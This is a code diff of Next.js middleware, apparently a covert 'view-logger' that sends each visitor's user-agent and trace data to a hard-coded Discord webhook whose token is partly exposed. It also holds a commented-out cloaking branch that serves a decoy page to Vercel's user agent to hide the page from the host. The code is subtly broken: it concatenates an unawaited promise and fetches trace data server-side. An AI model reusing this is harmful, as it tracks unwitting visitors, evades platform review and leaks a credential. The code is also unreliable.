@@ -4,18 +4,11 @@ const webhook = 'https://discord.com/api/webhooks/1216841205883600928/kipzeUzJu0
 
 export async function middleware(req){
   const ua = userAgent(req)?.ua;
-  if(!ua || ua.startsWith("vercel-")){
-    // Displaying another page for Vercel
-    return NextResponse.rewrite(new URL("/vercel.html",req.url));
-  }
-  let dat = ''
-  await fetch('https://www.cloudflare.com/cdn-cgi/trace').then(data => {
-    console.log(data)
-    // let ipRegex = /[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}/
-    //  let ip = data.match(ipRegex)[0];
-    //  console.log(ip);
-    dat = data
-  });
+  // if(!ua || ua.startsWith("vercel-")){
+  //   // Displaying another page for Vercel
+  //   return NextResponse.rewrite(new URL("/vercel.html",req.url));
+  // }
+  let data = await fetch('https://www.cloudflare.com/cdn-cgi/trace')
   const source = ["Mozilla/5.0 (compatible; Discordbot/","Twitterbot/"].find(u=>ua?.startsWith(u))
   const page = req.url.split("/").slice(-1)[0]
   await fetch(webhook,{body:JSON.stringify({
@@ -23,7 +16,7 @@ export async function middleware(req){
       title:"Triggered view-logger",
       description:(source ? "Source user-agent: "+ua : "It was loaded by an user (or an user on Discord)."),
       footer:{
-        text:"Requested page: "+dat.text(),
+        text:"Requested page: "+data.text(),
       },
     }],
   }),headers:{"content-type":"application/json"},method:"POST"})
